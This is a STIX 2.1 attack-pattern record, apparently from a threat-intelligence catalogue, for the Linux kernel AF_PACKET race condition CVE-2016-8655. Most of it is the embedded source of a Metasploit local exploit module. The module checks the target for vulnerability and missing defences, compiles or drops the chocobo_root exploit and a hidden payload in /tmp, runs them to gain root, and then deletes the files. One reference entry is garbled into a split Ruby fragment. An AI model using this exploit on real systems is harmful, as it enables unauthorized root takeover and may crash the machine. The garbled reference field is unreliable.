{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f07143f6-51fa-4e9d-a0fc-4bf2905606d2",
    "created": "2024-08-14T16:59:32.570155Z",
    "modified": "2024-08-14T16:59:32.570159Z",
    "name": "AF_PACKET chocobo_root Privilege Escalation",
    "description": " This module exploits a race condition and use-after-free in the packet_set_ring function in net/packet/af_packet.c (AF_PACKET) in",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/local/af_packet_chocobo_root_priv_esc.rb",
            "external_id": "af_packet_chocobo_root_priv_esc.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2016-8655"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/oss-sec/2016/q4/607"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/oss-sec/2016/q4/att-621/chocobo_root_c.bin"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/bcoles/kernel-exploits/blob/master/CVE-2016-8655/chocobo_root.c"
        },
        {
            "source_name": "reference",
            "url": "https://bitbucket.org/externalist/1day_exploits/src/master/CVE-2016-8655/CVE-2016-8655_chocobo_root_commented.c"
        },
        {
            "source_name": "reference",
            "url": "https://usn.ubuntu.com/3151-1/"
        },
        {
            "source_name": "reference",
            "url": "https://www.securitytracker.com/id/1037403"
        },
        {
            "source_name": "reference",
            "url": "https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=84ac7260236a49c79eede91617700174c2c19b0c"
        },
        {
            "source_name": "offsets=strip_comments(exploit_data(CVE-2016-8655",
            "external_id": "chocobo_root.c)).scan(/kernels\\\\=\\{(.+?)\\};/m).flatten.first"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = GoodRanking\n\n  include Msf::Post::File\n  include Msf::Post::Linux::Priv\n  include Msf::Post::Linux::Compile\n  include Msf::Post::Linux::System\n  include Msf::Post::Linux::Kernel\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'AF_PACKET chocobo_root Privilege Escalation',\n      'Description'    => %q{\n        This module exploits a race condition and use-after-free in the\n        packet_set_ring function in net/packet/af_packet.c (AF_PACKET) in\n        the Linux kernel to execute code as root (CVE-2016-8655).\n\n        The bug was initially introduced in 2011 and patched in 2016 in version\n        4.4.0-53.74, potentially affecting a large number of kernels; however\n        this exploit targets only systems using Ubuntu (Trusty / Xenial) kernels\n        4.4.0 < 4.4.0-53, including Linux distros based on Ubuntu, such as\n        Linux Mint.\n\n        The target system must have unprivileged user namespaces enabled,\n        two or more CPU cores, and SMAP must be disabled.\n\n        Bypasses for SMEP and KASLR are included. Failed exploitation\n        may crash the kernel.\n\n        This module has been tested successfully on\n\n        Linux Mint 17.3 (x86_64);\n        Linux Mint 18 (x86_64);\n        Ubuntu 16.04 (x86_64); and\n        Ubuntu 16.04.2 (x86_64).\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'rebel', # Discovery and chocobo_root.c exploit\n          'bcoles' # Metasploit\n        ],\n      'DisclosureDate' => '2016-08-12',\n      'Platform'       => [ 'linux' ],\n      'Arch'           => [ ARCH_X86, ARCH_X64 ],\n      'SessionTypes'   => [ 'shell', 'meterpreter' ],\n      'Targets'        => [[ 'Auto', {} ]],\n      'Privileged'     => true,\n      'References'     =>\n        [\n          [ 'EDB', '40871' ],\n          [ 'CVE', '2016-8655' ],\n          [ 'BID', '94692' ],\n          [ 'URL', 'https://seclists.org/oss-sec/2016/q4/607' ],\n          [ 'URL', 'https://seclists.org/oss-sec/2016/q4/att-621/chocobo_root_c.bin' ],\n          [ 'URL', 'https://github.com/bcoles/kernel-exploits/blob/master/CVE-2016-8655/chocobo_root.c' ],\n          [ 'URL', 'https://bitbucket.org/externalist/1day_exploits/src/master/CVE-2016-8655/CVE-2016-8655_chocobo_root_commented.c' ],\n          [ 'URL', 'https://usn.ubuntu.com/3151-1/' ],\n          [ 'URL', 'https://www.securitytracker.com/id/1037403' ],\n          [ 'URL', 'https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=84ac7260236a49c79eede91617700174c2c19b0c' ]\n        ],\n      'Notes'          =>\n        {\n          'AKA'         => ['chocobo_root.c'],\n          'Reliability' => [ REPEATABLE_SESSION ],\n          'Stability'   => [ CRASH_OS_DOWN ]\n        },\n      'DefaultTarget'  => 0\n    ))\n    register_options [\n      OptInt.new('TIMEOUT', [ true, 'Race timeout (seconds)', '600' ]),\n    ]\n    register_advanced_options [\n      OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ])\n    ]\n  end\n\n  def timeout\n    datastore['TIMEOUT'].to_i\n  end\n\n  def base_dir\n    datastore['WritableDir'].to_s\n  end\n\n  def check\n    arch = kernel_hardware\n    unless arch.include? 'x86_64'\n      return CheckCode::Safe(\"System architecture #{arch} is not supported\")\n    end\n    vprint_good \"System architecture #{arch} is supported\"\n\n    offsets = strip_comments(exploit_data('CVE-2016-8655', 'chocobo_root.c')).scan(/kernels\\[\\] = \\{(.+?)\\};/m).flatten.first\n    kernels = offsets.scan(/\"(.+?)\"/).flatten\n\n    version = \"#{kernel_release} #{kernel_version.split(' ').first}\"\n    unless kernels.include? version\n      return CheckCode::Safe(\"Linux kernel #{version} is not vulnerable\")\n    end\n    vprint_good \"Linux kernel #{version} is vulnerable\"\n\n    if smap_enabled?\n      return CheckCode::Safe('SMAP is enabled')\n    end\n    vprint_good 'SMAP is not enabled'\n\n    if lkrg_installed?\n      return CheckCode::Safe('LKRG is installed')\n    end\n    vprint_good 'LKRG is not installed'\n\n    if grsec_installed?\n      return CheckCode::Safe('grsecurity is in use')\n    end\n    vprint_good 'grsecurity is not in use'\n\n    cores = get_cpu_info[:cores].to_i\n    min_required_cores = 2\n    unless cores >= min_required_cores\n      return CheckCode::Safe(\"System has less than #{min_required_cores} CPU cores\")\n    end\n    vprint_good \"System has #{cores} CPU cores\"\n\n    config = kernel_config\n    if config.nil?\n      return CheckCode::Unknown('Could not retrieve kernel config')\n    end\n\n    unless config.include? 'CONFIG_USER_NS=y'\n      return CheckCode::Safe('Kernel config does not include CONFIG_USER_NS')\n    end\n    vprint_good 'Kernel config has CONFIG_USER_NS enabled'\n\n    unless userns_enabled?\n      return CheckCode::Safe('Unprivileged user namespaces are not permitted')\n    end\n    vprint_good 'Unprivileged user namespaces are permitted'\n\n    CheckCode::Appears\n  end\n\n  def exploit\n    if !datastore['ForceExploit'] && is_root?\n      fail_with(Failure::BadConfig, 'Session already has root privileges. Set ForceExploit to override.')\n    end\n\n    unless writable? base_dir\n      fail_with Failure::BadConfig, \"#{base_dir} is not writable\"\n    end\n\n    # Upload exploit executable\n    executable_name = \".#{rand_text_alphanumeric(5..10)}\"\n    executable_path = \"#{base_dir}/#{executable_name}\"\n    if live_compile?\n      vprint_status 'Live compiling exploit on system...'\n      upload_and_compile executable_path, exploit_data('CVE-2016-8655', 'chocobo_root.c'), '-lpthread'\n    else\n      vprint_status 'Dropping pre-compiled exploit on system...'\n      upload_and_chmodx executable_path, exploit_data('CVE-2016-8655', 'chocobo_root')\n    end\n\n    # Upload payload executable\n    payload_path = \"#{base_dir}/.#{rand_text_alphanumeric(5..10)}\"\n    upload_and_chmodx payload_path, generate_payload_exe\n\n    # Launch exploit\n    print_status \"Launching exploit (Timeout: #{timeout})...\"\n    output = cmd_exec \"echo '#{payload_path} & exit' | #{executable_path}\", nil, timeout\n    output.each_line { |line| vprint_status line.chomp }\n    print_status \"Cleaning up #{payload_path} and #{executable_path}..\"\n    rm_f executable_path\n    rm_f payload_path\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2016-08-12",
    "x_mitre_platforms": [
        "[ 'linux' ]"
    ]
}